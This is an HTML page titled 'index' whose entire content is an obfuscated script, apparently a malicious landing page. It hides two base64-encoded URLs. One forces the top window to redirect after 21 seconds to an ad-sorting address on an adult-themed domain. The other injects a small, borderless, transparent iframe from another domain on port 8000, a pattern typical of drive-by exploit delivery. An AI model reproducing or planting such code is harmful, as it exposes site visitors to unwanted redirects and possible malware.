<html><head><title>index</title></head><body><script>

function b64dc(str) {
 var b64c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg'+'hijklmnopqrstuvwxyz0123456789+/=';
 var b64d = '', chr1, chr2, chr3, enc1, enc2, enc3, enc4;
 str = str.replace(/[^a-z0-9+/=]/gi, '');
 for (var i=0; i<str.length;) {
  enc1 = b64c.indexOf(str.charAt(i++));
  enc2 = b64c.indexOf(str.charAt(i++));
  enc3 = b64c.indexOf(str.charAt(i++));
  enc4 = b64c.indexOf(str.charAt(i++));
  chr1 = (enc1 << 2) | (enc2 >> 4);
  chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
  chr3 = ((enc3 & 3) << 6) | enc4;
  b64d = b64d + String.fromCharCode(chr1);
  if (enc3 < 64) { b64d += String.fromCharCode(chr2); }
  if (enc4 < 64) { b64d += String.fromCharCode(chr3); }
 }
 return b64d;
};

function gotime() { xflag=false; if (typeof(location.replace)!='undefined') { top.location.replace( b64dc("aHR0cDovL2FpY2ptOWM1cGFxdGlhcHNyejN2N25qLmFsbHNleG9wZW4uY29tL2Fkc29ydC5waHA/eXk9MSZhaWQ9MiZhdHI9ZXh0cyZzcmM9MzE2") ); } else { top.location.href = b64dc("aHR0cDovL2FpY2ptOWM1cGFxdGlhcHNyejN2N25qLmFsbHNleG9wZW4uY29tL2Fkc29ydC5waHA/eXk9MSZhaWQ9MiZhdHI9ZXh0cyZzcmM9MzE2"); }; }; var timer=setTimeout("gotime()", 21000);
 var kwuc;
 kwuc=document.createElement("span");
 kwuc.innerHTML=b64dc("PGlmcmFtZSBzcmM9Imh0dHA6Ly9kdThzaXVuLmZyYXBkYXlzLmNvbTo4MDAwL2ZnZXBpa2pmY2s/aW5ueWo9MzQxMDU3NSIgd2lkdGg9IjEyMCIgIGhlaWdodD0iMjEiIG1hcmdpbndpZHRoPSIwIiBtYXJnaW5oZWlnaHQ9IjAiIGZyYW1lYm9yZGVyPSIwIiAgc2Nyb2xsaW5nPSJubyIgYWxsb3d0cmFuc3BhcmVuY3k9InRydWUiPjwvaWZyYW1lPjxicj4=");
 setTimeout(function() { document.body.insertBefore(kwuc,document.body.lastChild); }, 515);
</script></body></html>